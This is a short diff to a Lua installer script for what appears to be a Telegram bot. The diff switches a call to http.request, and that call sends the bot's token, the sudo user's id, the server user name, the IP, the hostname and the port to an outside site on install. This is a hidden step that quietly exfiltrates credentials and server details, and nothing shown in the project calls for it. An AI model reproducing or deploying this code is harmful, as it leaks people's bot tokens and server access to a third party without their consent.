@@ -4,6 +4,7 @@ serpent = dofile("./library/serpent.lua")
 json = dofile("./library/JSON.lua") 
 JSON  = dofile("./library/dkjson.lua")
 URL = require('socket.url')  
+http = require("socket.http")
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
@@ -84,7 +85,7 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
-URL.request("https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+http.request("https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("TELAND", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
